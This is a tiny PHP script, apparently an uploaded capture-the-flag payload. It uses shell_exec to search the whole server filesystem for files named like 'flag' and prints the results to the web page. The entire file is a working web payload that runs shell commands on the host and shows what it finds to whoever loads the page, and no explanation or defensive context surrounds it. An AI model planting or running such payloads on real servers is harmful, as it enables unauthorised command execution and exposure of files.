<?php
$output = shell_exec("find / -name '*flag*'");
echo "<pre>$output</pre>";
?>